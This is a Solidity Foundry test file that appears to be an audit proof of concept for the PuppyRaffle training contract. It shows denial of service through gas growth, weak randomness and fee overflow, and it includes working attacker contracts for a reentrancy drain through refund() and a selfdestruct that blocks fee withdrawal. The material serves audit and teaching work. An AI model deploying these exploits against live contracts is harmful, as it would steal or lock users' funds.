// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;
pragma experimental ABIEncoderV2;

import {Test, console} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract Exploits is Test {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 1e18;
    address feeAddress = makeAddr("feeAddress");
    uint256 duration = 1 days;

    function setUp() public {
        puppyRaffle = new PuppyRaffle(
            entranceFee,
            feeAddress,
            duration
        );
    }

    function test_dos() public {
        //Setting the gas price to 1
        vm.txGasPrice(1);
        //Lets enter 1000 players
        address[] memory players = new address[](1000);
        for(uint i = 0; i<1000; i++){
            players[i] = address(i);
        }
        //Gas cost for entering the first 1000 players
        uint256 gasStartA = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * players.length}(players);
        uint256 gasEndA = gasleft();
        uint256 gasUsedA = (gasStartA - gasEndA) * tx.gasprice;
        console.log("Gas cost for entering the first 1000 players: ", gasUsedA);

        //Lets enter another 1000 players
        for(uint i = 0; i<1000; i++){
            players[i] = address(i+1000);
        }
        //Gas cost for entering the second 1000 players
        uint256 gasStartB = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * players.length}(players);
        uint256 gasEndB = gasleft();
        uint256 gasUsedB = (gasStartB - gasEndB) * tx.gasprice;
        console.log("Gas cost for entering the second 1000 players: ", gasUsedB);

        assertTrue(gasUsedA < gasUsedB);
    }

    function test_getActivePlayersIndexReturnsZeroWhenPlayerIsInZeroPosition() public {
        address[] memory players = new address[](1);
        players[0] = address(1);
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        assertEq(puppyRaffle.getActivePlayerIndex(address(1)), 0);
    }

    function test_ReentrancyAttack() public {
        address[] memory players = new address[](4);
        players[0] = address(1);
        players[1] = address(2);
        players[2] = address(3);
        players[3] = address(4);
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

        ReentrancyAttacker attackerContract = new ReentrancyAttacker(puppyRaffle);
        address attacker = makeAddr("attacker");
        vm.deal(attacker, 1 ether);

        uint256 attackerContractStartingBalance = address(attackerContract).balance;
        uint256 puppyRaffleStartingBalance = address(puppyRaffle).balance;

        console.log("Starting balance of PuppyRaffle is: ", puppyRaffleStartingBalance);
        console.log("Starting balance of Attacker is: ", attackerContractStartingBalance);

        vm.prank(attacker);
        attackerContract.attack{value: entranceFee}();

        uint256 attackerContractEndingBalance = address(attackerContract).balance;
        uint256 puppyRaffleEndingBalance = address(puppyRaffle).balance;

        console.log("Ending balance of PuppyRaffle is: ", puppyRaffleEndingBalance);
        console.log("Ending balance of Attacker is: ", attackerContractEndingBalance);
    }

    function test_SelfdestructToBreakWithdraw() public {
        //Enter players
        address[] memory players = new address[](4);
        players[0] = address(1);
        players[1] = address(2);
        players[2] = address(3);
        players[3] = address(4);
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
        //Select winner
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);
        puppyRaffle.selectWinner();
        //Balances before
        console.log("Balance of contract before attack: ", address(puppyRaffle).balance);
        console.log("Balance of fees before attack: ", puppyRaffle.totalFees());
        //Selfdestruct attacker contract
        SelfdestructAttack attackerContract = new SelfdestructAttack(puppyRaffle);
        address attacker = makeAddr("attacker");
        vm.prank(attacker);
        vm.deal(attacker, 1 wei);
        attackerContract.attack{value: 1 wei}();
        //Balances
        console.log("Balance of contract after attack: ", address(puppyRaffle).balance);
        console.log("Balance of fees after attack: ", puppyRaffle.totalFees());
        //Withdraw
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();
    }

    function test_UnsafeTypeCastingOfFees() public {
        //Lets enter 100 players
        address[] memory players = new address[](100);
        for(uint i = 0; i<100; i++){
            players[i] = address(i);
        }
        puppyRaffle.enterRaffle{value: entranceFee * players.length}(players);

        //Calculate expected fees to be collected
        uint256 totalAmountCollected = address(puppyRaffle).balance;
        uint256 fee = (totalAmountCollected * 20) / 100;
        console.log("Balance of PuppyRaffle before selectWinner: ", address(puppyRaffle).balance);
        console.log("Fees calculated to be collected: ", fee);
        //Select Winner
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);
        puppyRaffle.selectWinner();
        //Actual fees to be collected
        console.log("Balance of PuppyRaffle after selectWinner: ", address(puppyRaffle).balance);
        console.log("Value of totalFees after select winner: ", puppyRaffle.totalFees());
        //Assertions
        assertTrue(fee > type(uint64).max);
        assertTrue(puppyRaffle.totalFees() < fee);
        assertTrue(puppyRaffle.totalFees() < type(uint64).max);
    }

    function test_ArithmeticOverflowOfFeesStopsWithdrawls() public {
        //Lets enter 100 players
        address[] memory players = new address[](100);
        for(uint i = 0; i<100; i++){
            players[i] = address(i);
        }
        puppyRaffle.enterRaffle{value: entranceFee * players.length}(players);
        //Select Winner
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);
        puppyRaffle.selectWinner();
        //Attempt to withdraw
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();
    }

    function test_InsufficientRandomnessPoC() public {
        //--- Preperation phase---
        //This phase can be repeated with as many wallets as required until the attacker is satisfied with the index and rarity calculated

        address attacker = makeAddr("attacker");
        vm.deal(attacker, 1 ether);
        //Attacker calculates conditions required to win, block.timestamp can be manipulated and calculated against repeatedly
        uint256 chosenWinnerIndex = uint256(keccak256(abi.encodePacked(attacker, block.timestamp + duration + 1, block.difficulty))) % 4;
        //Attacker calculates rarity received
        uint256 rarity = uint256(keccak256(abi.encodePacked(attacker, block.difficulty))) % 100;
        console.log("The winner index for the conditions of Attacker calling select winner, duration+1 amount of time has passed, with 4 players: ", chosenWinnerIndex);
        console.log("The rarity the Attacker will receive is: ", rarity);
        //Attacker now knows values
        assertEq(chosenWinnerIndex,1);
        assertEq(rarity,25);

        //---Attacker watches and enters at right time---

        //Player one enters and occupies index 0
        address[] memory playerOneEntries = new address[](1);
        playerOneEntries[0] = address(1);
        vm.prank(address(1));
        vm.deal(address(1), 1 ether);
        puppyRaffle.enterRaffle{value: entranceFee}(playerOneEntries);
        //Attacker enters and occupies index 1
        address[] memory attackerEntries = new address[](1);
        attackerEntries[0] = attacker;
        vm.prank(attacker);
        puppyRaffle.enterRaffle{value: entranceFee}(attackerEntries);

        //---Attacker watches if the correct conditions are met---
        //If for example a new players comes in entering more players than calculated with, the attacker can frontrun a selectWinner() call with a refund() to protect their funds
        //If the attacker is the one proposing the block themselves they can order their own transaction as required to induce the necessary conditions

        //Player two enters and occupies index 2/3
        address[] memory playerTwoEntries = new address[](2);
        playerTwoEntries[0] = address(2);
        playerTwoEntries[1] = address(3);
        vm.prank(address(2));
        vm.deal(address(2), 2 ether);
        puppyRaffle.enterRaffle{value: entranceFee * 2}(playerTwoEntries);
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);
        //Necessary conditions so attacker calls select winner
        console.log("Balance of attacker before winner is selected: ", address(attacker).balance);
        assertEq(puppyRaffle.getActivePlayerIndex(attacker),1);
        vm.prank(attacker);
        puppyRaffle.selectWinner();
        console.log("Balance of attacker after winner is selected: ", address(attacker).balance);
        assertEq(puppyRaffle.balanceOf(attacker), 1);
    }
}

contract ReentrancyAttacker {
    
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 1e18;
    uint256 attackerIndex;

    constructor(PuppyRaffle _puppyRaffle){
        puppyRaffle = _puppyRaffle;
        entranceFee = puppyRaffle.entranceFee();
    }

    function attack() external payable {
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(attackerIndex);
    }

    function _stealBalance() internal {
        if(address(puppyRaffle).balance >= entranceFee) {
            puppyRaffle.refund(attackerIndex);
        }
    }

    fallback() external payable{
        _stealBalance();
    }

    receive() external payable{
        _stealBalance();
    }
}

contract SelfdestructAttack {
    PuppyRaffle puppyRaffle;

    constructor(PuppyRaffle _puppyRaffle) {
        puppyRaffle = _puppyRaffle;
    }

    function attack() public payable {
        address payable addr = payable(address(puppyRaffle));
        selfdestruct(addr);
    }
}